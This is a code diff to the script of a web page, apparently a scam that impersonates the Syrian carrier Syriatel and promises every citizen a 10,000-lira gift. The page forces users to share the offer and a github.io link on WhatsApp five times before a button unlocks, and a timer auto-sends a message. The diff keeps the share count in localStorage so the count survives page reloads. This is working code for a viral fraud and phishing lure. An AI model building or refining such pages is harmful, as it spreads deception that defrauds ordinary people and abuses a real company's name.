@@ -114,14 +114,11 @@
         const delay = 10; // عدد الثواني قبل الإرسال التلقائي
         const siteLink = "https://azaamazeez.github.io/Newaa/"; // رابط الموقع
         const fullMessage = `أهلاً بك في سوريا الجديدة. نقدم لكل مواطن سوري مبلغ قدره 10000 عشرة آلاف ليرة هدية مقدمة من سيريتيل.\n\nرابط الموقع: ${siteLink}`;
-        
-        let shareCount = 0; // عدد المشاركات
 
-        // وظيفة مشاركة الرسالة عبر واتس آب
-        function shareOnWhatsApp() {
-            // كلما شارك المستخدم، ازداد العد
-            shareCount++;
-            // تحديث عدد المشاركات المتبقية
+        let shareCount = parseInt(localStorage.getItem("shareCount")) || 0; // عدد المشاركات من localStorage
+
+        // تحديث العد في واجهة المستخدم
+        function updateShareCount() {
             const remainingShares = 5 - shareCount;
             document.getElementById("remainingShares").textContent = remainingShares;
 
@@ -129,9 +126,20 @@
             if (shareCount >= 5) {
                 document.getElementById("copyBtn").disabled = false;
             }
-            const whatsappUrl = `https://wa.me/?text=${encodeURIComponent(fullMessage)}`;
-            window.open(whatsappUrl, "_blank");
-            alert(`تمت المشاركة! عدد المشاركات الحالية: ${shareCount}`);
+        }
+
+        // وظيفة مشاركة الرسالة عبر واتس آب
+        function shareOnWhatsApp() {
+            if (shareCount < 5) {
+                // زيادة عدد المشاركات
+                shareCount++;
+                localStorage.setItem("shareCount", shareCount); // حفظ عدد المشاركات في localStorage
+                updateShareCount();
+
+                const whatsappUrl = `https://wa.me/?text=${encodeURIComponent(fullMessage)}`;
+                window.open(whatsappUrl, "_blank");
+                alert(`تمت المشاركة! عدد المشاركات الحالية: ${shareCount}`);
+            }
         }
 
         // وظيفة نسخ النص والرابط ومشاركته عبر واتس آب
@@ -166,6 +174,9 @@
                 sendMessage(); // إرسال الرسالة تلقائيًا
             }
         }, 1000); // تحديث كل ثانية
+
+        // تحديث العد عند تحميل الصفحة
+        updateShareCount();
     </script>
 </body>
 </html>
